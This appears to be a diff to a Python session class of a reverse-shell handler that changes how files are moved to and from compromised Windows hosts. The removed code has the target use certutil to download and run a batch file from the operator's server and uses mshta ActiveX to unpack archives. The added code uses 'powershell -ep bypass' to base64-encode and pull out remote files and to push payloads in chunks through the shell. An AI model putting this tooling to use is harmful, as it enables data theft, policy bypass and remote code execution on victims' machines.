@@ -2404,7 +2404,7 @@ class Session:
 
 			elif self.OS == 'Windows':
 				write_test_file = rand(16)
-				cmd = 'type nul > {write_test_file}.tmp 2>nul && (echo OK) || (echo NO) & del {write_test_file}.tmp 2>nul'
+				cmd = f'type nul > {write_test_file}.tmp 2>nul && (echo OK) || (echo NO) & del {write_test_file}.tmp 2>nul'
 				response = self.exec(cmd, force_cmd=True, value=True)
 				if response == "NO":
 					logger.error(f"{directory}: Access is denied.")
@@ -3528,28 +3528,25 @@ class Session:
 
 		elif self.OS == 'Windows':
 			remote_tempfile = f"{self.tmp}\\{rand(10)}.zip"
-			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
-			remote_items_ps = r'\", \"'.join(shlex.split(remote_items))
-			cmd = (
-				f'@powershell -command "$archivepath=\'{remote_tempfile}\';compress-archive -path \'{remote_items_ps}\''
-				' -DestinationPath $archivepath;'
-				'$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
-				'Remove-Item $archivepath;'
-				'Write-Host $b64"'
-			)
-			with open(tempfile_bat, "w") as f:
-				f.write(cmd)
-
-			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
-			urlpath_bat = server.add(tempfile_bat)
-			temp_remote_file_bat = urlpath_bat.split("/")[-1]
-			server.start()
-			data = self.exec(
-				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" '
-				f'"%TEMP%\\{temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&'
-				f'del "%TEMP%\\{temp_remote_file_bat}"',
-				force_cmd=True, value=True, timeout=None)
-			server.stop()
+			remote_items_ps = "', '".join(shlex.split(remote_items))
+			if self.subtype == 'psh':
+				cmd = (
+					f"$archivepath='{remote_tempfile}';"
+					f"Compress-Archive -Path '{remote_items_ps}' -DestinationPath $archivepath;"
+					f"$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));"
+					f"Remove-Item $archivepath;"
+					f"Write-Host $b64"
+				)
+			else:
+				cmd = (
+					f'powershell -ep bypass -c "'
+					f"$archivepath='{remote_tempfile}';"
+					f"Compress-Archive -Path '{remote_items_ps}' -DestinationPath $archivepath;"
+					f"$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));"
+					f"Remove-Item $archivepath;"
+					f'Write-Host $b64"'
+				)
+			data = self.exec(cmd, value=True, timeout=None)
 
 			if not data:
 				return []
@@ -3767,78 +3764,127 @@ class Session:
 					return [] # TODO
 
 		elif self.OS == 'Windows':
-			with ExitStack() as stack:
-				# Fire up File Server
-				server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
-				server.start()
-				stack.callback(lambda: server.term.wait(options.short_timeout))
-				stack.callback(lambda: server.stop())
-				server.init.wait(options.short_timeout)
-
-				if not hasattr(server, 'id'):
-					return []
-
-				tempfile_zip = f'/dev/shm/{rand(16)}.zip'
-				stack.callback(lambda p=tempfile_zip: os.path.exists(p) and os.remove(p))
-				tempfile_bat = f'/dev/shm/{rand(16)}.bat'
-				stack.callback(lambda p=tempfile_bat: os.path.exists(p) and os.remove(p))
-
-				with zipfile.ZipFile(tempfile_zip, 'w') as myzip:
-					altnames = []
-					for item in resolved_items:
-						if isinstance(item, tuple):
-							filename, data = item
-							if randomize_fname:
-								filename = Path(filename)
-								altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
-							else:
-								altname = filename
-							zip_info = zipfile.ZipInfo(filename=str(altname))
-							zip_info.date_time = time.localtime(time.time())[:6]
-							myzip.writestr(zip_info, data)
+			# Build zip in memory
+			zip_buffer = io.BytesIO()
+			with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as myzip:
+				altnames = []
+				for item in resolved_items:
+					if isinstance(item, tuple):
+						filename, data = item
+						if randomize_fname:
+							filename = Path(filename)
+							altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
 						else:
-							if item.is_dir():
-								altname = f"{item.name}-{rand(8)}" if randomize_fname else item.name
-								for p in item.rglob("*"):
-									if not p.is_file():
-										continue
-									rel = p.relative_to(item)
-									altname_file = Path(altname) / rel
-									myzip.write(p, arcname=str(altname_file))
-							else:
-								altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
-								myzip.write(item, arcname=altname)
-						altnames.append(altname)
+							altname = filename
+						zip_info = zipfile.ZipInfo(filename=str(altname))
+						zip_info.date_time = time.localtime(time.time())[:6]
+						myzip.writestr(zip_info, data)
+					else:
+						if item.is_dir():
+							altname = f"{item.name}-{rand(8)}" if randomize_fname else item.name
+							for p in item.rglob("*"):
+								if not p.is_file():
+									continue
+								rel = p.relative_to(item)
+								altname_file = Path(altname) / rel
+								myzip.write(p, arcname=str(altname_file))
+						else:
+							altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
+							myzip.write(item, arcname=altname)
+					altnames.append(altname)
 
-				urlpath_zip = server.add(tempfile_zip)
+			# Base64 encode the zip and transfer through the shell
+			zip_buffer.seek(0)
+			b64data = base64.b64encode(zip_buffer.read()).decode()
+			temp_zip = f"{self.tmp}\\{rand(10)}.zip"
 
-				dst_escaped = destination.replace('\\', '\\\\')
-				tmp_escaped = self.tmp.replace('\\', '\\\\')
-				temp_remote_file_zip = urlpath_zip.split("/")[-1]
+			logger.info(paint(f"Transferring {len(b64data)} bytes (base64) through shell...").blue)
 
-				fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}" && echo DOWNLOAD OK'
-				unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{dst_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()" && echo UNZIP OK'
+			# Limit for inline PowerShell: ~7000 chars leaves room for the
+			# rest of the command within cmd.exe's 8191-char line limit
+			if len(b64data) <= 7000:
+				# Small payload — single inline PowerShell command
+				dst_ps = destination.replace("'", "''")
+				if self.subtype == 'psh':
+					ps_cmd = (
+						f"$b = [Convert]::FromBase64String('{b64data}'); "
+						f"[IO.File]::WriteAllBytes('{temp_zip}', $b); "
+						f"Expand-Archive -Path '{temp_zip}' "
+						f"-DestinationPath '{dst_ps}' -Force; "
+						f"Remove-Item '{temp_zip}' -Force; "
+						f"echo EXTRACT_OK"
+					)
+				else:
+					ps_cmd = (
+						f'powershell -ep bypass -c "'
+						f"$b = [Convert]::FromBase64String('{b64data}'); "
+						f"[IO.File]::WriteAllBytes('{temp_zip}', $b); "
+						f"Expand-Archive -Path '{temp_zip}' "
+						f"-DestinationPath '{dst_ps}' -Force; "
+						f"Remove-Item '{temp_zip}' -Force; "
+						f"echo EXTRACT_OK"
+						f'"'
+					)
+				response = self.exec(ps_cmd, value=True, timeout=None)
+			else:
+				# Large payload — write base64 chunks to a file, then extract
+				temp_b64 = f"{self.tmp}\\{rand(10)}.b64"
+				chunk_size = 4000
 
-				with open(tempfile_bat, "w") as f:
-					f.write(fetch_cmd + "\n")
-					f.write(unzip_cmd)
+				if self.subtype == 'psh':
+					# PowerShell shell: use Add-Content directly
+					first = True
+					for chunk in chunks(b64data, chunk_size):
+						if first:
+							response = self.exec(
+								f"Set-Content -Path '{temp_b64}' -Value '{chunk}' -NoNewline",
+							)
+							first = False
+						else:
+							response = self.exec(
+								f"Add-Content -Path '{temp_b64}' -Value '{chunk}' -NoNewline",
+							)
+						if response is False:
+							logger.error("Upload interrupted during data transfer")
+							self.exec(f"Remove-Item '{temp_b64}' -Force -ErrorAction SilentlyContinue")
+							return []
+				else:
+					# CMD shell: use echo >> (no force_cmd quoting issue)
+					for chunk in chunks(b64data, chunk_size):
+						response = self.exec(f'echo {chunk}>>"{temp_b64}"')
+						if response is False:
+							logger.error("Upload interrupted during data transfer")
+							self.exec(f'del "{temp_b64}" 2>nul')
+							return []
 
-				urlpath_bat = server.add(tempfile_bat)
-				temp_remote_file_bat = urlpath_bat.split("/")[-1]
-				response = self.exec(
-					f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
-					force_cmd=True, value=True, timeout=None)
+				dst_ps = destination.replace("'", "''")
+				if self.subtype == 'psh':
+					ps_cmd = (
+						f"$b64 = (Get-Content -Raw '{temp_b64}') -replace '\\s'; "
+						f"[IO.File]::WriteAllBytes('{temp_zip}', "
+						f"[Convert]::FromBase64String($b64)); "
+						f"Expand-Archive -Path '{temp_zip}' "
+						f"-DestinationPath '{dst_ps}' -Force; "
+						f"Remove-Item '{temp_b64}', '{temp_zip}' -Force; "
+						f"echo EXTRACT_OK"
+					)
+				else:
+					ps_cmd = (
+						f'powershell -ep bypass -c "'
+						f"$b64 = (Get-Content -Raw '{temp_b64}') -replace '\\s'; "
+						f"[IO.File]::WriteAllBytes('{temp_zip}', "
+						f"[Convert]::FromBase64String($b64)); "
+						f"Expand-Archive -Path '{temp_zip}' "
+						f"-DestinationPath '{dst_ps}' -Force; "
+						f"Remove-Item '{temp_b64}', '{temp_zip}' -Force; "
+						f"echo EXTRACT_OK"
+						f'"'
+					)
+				response = self.exec(ps_cmd, value=True, timeout=None)
 
-				if not response:
-					logger.error("Upload initialization failed...")
-					return []
-				if not "DOWNLOAD OK" in response:
-					logger.error("Data transfer failed...")
-					return []
-				if not "UNZIP OK" in response:
-					logger.error("Data unpacking failed...")
-					return []
-
+			if not response or 'EXTRACT_OK' not in response:
+				logger.error(f"Extraction failed: {response}")
+				return []
 		# Present uploads
 		uploaded_paths = []
 		for item in altnames:
